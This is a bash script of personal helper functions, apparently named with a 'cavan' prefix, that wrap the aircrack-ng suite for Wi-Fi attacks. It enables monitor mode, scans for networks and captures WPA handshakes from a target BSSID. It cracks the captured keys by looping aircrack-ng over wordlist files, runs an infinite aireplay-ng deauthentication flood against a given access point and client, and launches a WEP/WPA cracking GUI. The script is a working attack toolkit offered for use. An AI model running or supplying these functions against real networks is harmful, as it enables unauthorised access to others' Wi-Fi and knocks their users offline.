#!/bin/bash

function cavan-wifi-mon-start()
{
	sudo airmon-ng start $1
}

function cavan-wifi-mon-stop()
{
	sudo airmon-ng stop $1
}

function cavan-wifi-mon-scan()
{
	sudo airodump-ng $1
}

function cavan-wifi-mon-capture()
{
	local savedir="/temp/cavan-wifi"
	local pathname="${savedir}/$(echo $1 | tr ':' '-')"

	echo "bssid = $1"
	echo "channel = $2"
	echo "interface = $3"
	echo "pathname = ${pathname}"

	echo "Press enter to start"
	read

	sudo mkdir -pv "${savedir}"
	sudo airodump-ng -c $2 -w "${pathname}" --bssid $1 $3
}

function cavan-wifi-mon-crack()
{
	local words="$1"

	shift

	echo "words = ${words}"
	echo "datas = $*"

	if [ -d "${words}" ]
	then
		for fn in $(find "${words}" -type f -iname "*.txt")
		do
			date
			ls -lh "$fn"

			local key=$(aircrack-ng -w "$fn" $* | grep "KEY FOUND!" | sed 's/^.*\[ \(.*\) \].*$/\1/g' | uniq)
			[ -n "$key" ] &&
			{
				echo "key = '$key'"
				break
			}
		done
	else
		echo "Press enter to start"
		read
		aircrack-ng -w "${words}" $*
	fi
}

function cavan-wifi-mon-deauth()
{
	echo "ap_mac = $1"
	echo "client_mac = $2"
	echo "interface = $3"

	while :;
	do
		sudo aireplay-ng --ignore-negative-one -0 10 -a $1 -c $2 $3
	done
}

function cavan-wifi-minidwep-gtk()
{
	sudo bash /usr/local/bin/minileafdwep/minidwep-gtk.sh
}
